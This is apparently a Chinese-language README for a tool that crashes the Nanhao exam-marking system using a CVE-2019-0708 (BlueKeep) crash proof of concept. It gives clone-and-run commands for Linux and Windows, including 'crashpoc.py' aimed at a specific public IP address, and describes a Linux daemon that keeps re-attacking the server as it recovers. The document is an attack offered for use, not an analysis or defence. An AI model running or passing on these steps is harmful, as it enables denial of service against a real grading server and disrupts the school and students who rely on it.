# Dysy-Scoring-Killer
南昊阅卷信息系统自动崩溃器

本代码基于CVE-2019-0708,因为原代码库未添加任何协议,因此此存储库无权添加开源协议。

## 运行(Linux)

前提:Python 3.0+环境,Pip3环境,Git环境

>git clone https://github.com/Dysyzx/Dysy-Scoring-Killer.git

>cd Dysy-Scoring-Killer

>chmod +x run.sh

>pip3 install impacket

>sh run.sh

## 运行(Windows)

Windows代码没有守护性,运行一次之后不会有守护进程重启,服务端如果带有自我恢复进攻则时效较短

前提:Python 3.0+环境,Pip3环境,Git For Windows环境

>git clone https://github.com/Dysyzx/Dysy-Scoring-Killer.git

>cd Dysy-Scoring-Killer

>pip3 install impacket

>python crashpoc.py 218.56.181.50 64
